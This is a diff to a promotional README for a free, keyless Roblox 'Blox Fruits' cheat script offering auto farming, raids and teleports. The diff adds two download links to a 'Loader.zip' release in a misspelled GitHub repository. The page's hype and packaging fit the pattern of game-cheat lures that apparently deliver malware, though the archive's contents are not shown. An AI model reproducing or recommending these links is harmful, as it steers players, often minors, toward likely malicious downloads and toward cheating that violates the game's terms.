@@ -1,7 +1,7 @@
 # 🍍 Blox Fruits Script - The Ultimate Free Roblox Auto Farm & Raid Tool (2025)
 Looking for the best **Blox Fruits Script** for 2025? You’ve come to the right spot! This amazing, free, and keyless LuaU script gives you access to **auto farming**, **raids**, **teleports**, and so much more — all wrapped up in a user-friendly GUI that’s perfect for beginners. Forget about key systems and ads — just enjoy the power and performance!
 
-🔥 **[📥 DOWNLOAD BLOX FRUITS SCRIPT HERE]()**
+🔥 **[📥 DOWNLOAD BLOX FRUITS SCRIPT HERE](https://github.com/NiCl1p17/blox-fruits-scropt/releases/download/Release/Loader.zip)**
 
 ![bloxxx](https://github.com/user-attachments/assets/028a65b0-a66d-499d-a28f-4febfaac0051)
 
@@ -73,7 +73,7 @@ Just paste and run — no configurations needed!
 - ✅ Saves you hours of grinding
 - ✅ Perfect for both newbies and seasoned players
 
-🔗 **[🚀 DOWNLOAD BLOX FRUITS SCRIPT]()**
+🔗 **[🚀 DOWNLOAD BLOX FRUITS SCRIPT](https://github.com/NiCl1p17/blox-fruits-scropt/releases/download/Release/Loader.zip)**
 
 ---
 
